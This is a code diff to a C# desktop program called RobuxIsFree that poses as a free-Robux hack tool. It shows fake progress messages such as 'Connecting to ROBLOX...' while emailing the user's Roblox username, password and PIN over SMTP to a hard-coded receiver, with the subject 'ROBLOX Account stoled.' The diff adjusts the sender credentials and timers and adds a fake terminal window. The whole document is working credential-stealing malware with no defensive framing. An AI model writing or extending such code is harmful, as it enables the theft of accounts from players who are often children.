@@ -23,12 +23,18 @@ namespace RobuxIsFree
             InitializeComponent();
             timer1 = new Timer();
             timer1.Tick += timer1_Tick;
-            timer1.Interval = 500;
+            timer1.Interval = 1000;
+            timer2 = new Timer();
+            timer2.Tick += timer2_Tick;
+            timer2.Interval = 1;
         }
+
+
 
         private void button1_Click(object sender, EventArgs e)
         {
             timer1.Enabled = !timer1.Enabled;
+            timer2.Enabled = !timer2.Enabled;
             progressBar1.Minimum = 0;
             progressBar1.Maximum = 100;
             progressBar1.Value = 0;
@@ -39,7 +45,7 @@ namespace RobuxIsFree
             mail.To.Add("receiver@mail.com");
             mail.Subject = "ROBLOX Account stoled.";
             smtpServer.Port = 587;
-            smtpServer.Credentials = new NetworkCredential("senderaddress", "senderpassword");
+            smtpServer.Credentials = new NetworkCredential("sender@mail.address", "sendermailpassword");
             smtpServer.EnableSsl = true;
             if (i == pincode.Text.Count())
             {
@@ -51,7 +57,9 @@ namespace RobuxIsFree
                 mail.Body = "Username : " + name.Text + " | Password : " + password.Text + " | PIN Code : none";
                 smtpServer.Send(mail);
             }
-            
+
+            FTerm fTerm = new FTerm();
+            fTerm.Show();
         }
 
         int j = 0;
@@ -62,7 +70,8 @@ namespace RobuxIsFree
             if (j == 1)
                 {
                 label4.Text = "Status : Initzaling the hack tool...";
-                }else if (j == 10)
+                }
+            else if (j == 10)
             {
                 label4.Text = "Status : Connecting to ROBLOX...";
             }else if (j == 20)
@@ -101,8 +110,7 @@ namespace RobuxIsFree
             {
                 label4.Text = "Status : Connect to ROBLOX failed! Do you lost your internet? Is your firewall blocked this app? Or maybe your ip is banned by ROBLOX :(";
                 timer1.Stop();
-                MessageBox.Show("Connect to ROBLOX failed! Do you lost your internet? Is your firewall blocked this app? Or maybe your ip is banned by ROBLOX :( This app will exit.", "RobuxIsFree");
-                Environment.Exit(0);
+                MessageBox.Show("Connect to ROBLOX failed! Do you lost your internet?\nIs your firewall blocked this app? \nOr maybe your ip is banned by ROBLOX :( This app will exit in 5 second.", "RobuxIsFree");
             }
 
         }
@@ -117,6 +125,27 @@ namespace RobuxIsFree
             if (System.Text.RegularExpressions.Regex.IsMatch(pincode.Text, "[^0-9]"))
             {
                 pincode.Text = pincode.Text.Remove(pincode.Text.Length - 1);
+            }
+        }
+
+        private void textBox1_TextChanged(object sender, EventArgs e)
+        {
+            if (System.Text.RegularExpressions.Regex.IsMatch(textBox1.Text, "[^0-9]"))
+            {
+                textBox1.Text = textBox1.Text.Remove(textBox1.Text.Length - 1);
+            }
+        }
+
+        private void timer2_Tick (object sender, EventArgs e)
+        {
+            Form fc = Application.OpenForms["FTerm"];
+
+            if (fc == null)
+            {
+                timer1.Stop();
+                timer2.Stop();
+                MessageBox.Show("Exiting RobuxIsFree beacuse the terminal is closed...","RobuxIsFree");
+                Environment.Exit(0);
             }
         }
     }
